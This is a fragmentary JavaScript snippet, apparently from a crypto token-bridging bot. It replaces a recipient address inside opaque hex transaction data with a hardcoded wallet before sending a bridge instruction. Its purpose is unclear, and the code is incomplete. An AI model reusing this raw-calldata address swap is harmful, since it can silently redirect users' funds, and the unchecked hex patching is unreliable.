...
const newWallet = '0x1D903e72F84d24B8544D58c0786370Cf08a35790';
const newPrefixedAddress = '14' + newWallet.toLowerCase().replace(/^0x/, '');

// Original hex data with address replacement
const originalHex = `
...

`.replace(/\s+/g, ''); // remove line breaks and spaces

const updatedHex = originalHex.split(oldPrefixedAddress).join(newPrefixedAddress);
...
class BridgeManager {
  ...
  async bridgeTokens(wallet, nonceManager, amount, txCount) {
    try {
      ...
      // Updated instruction with the replaced hex data
      const instruction = [
        0,
        2,
        "0x" + updatedHex
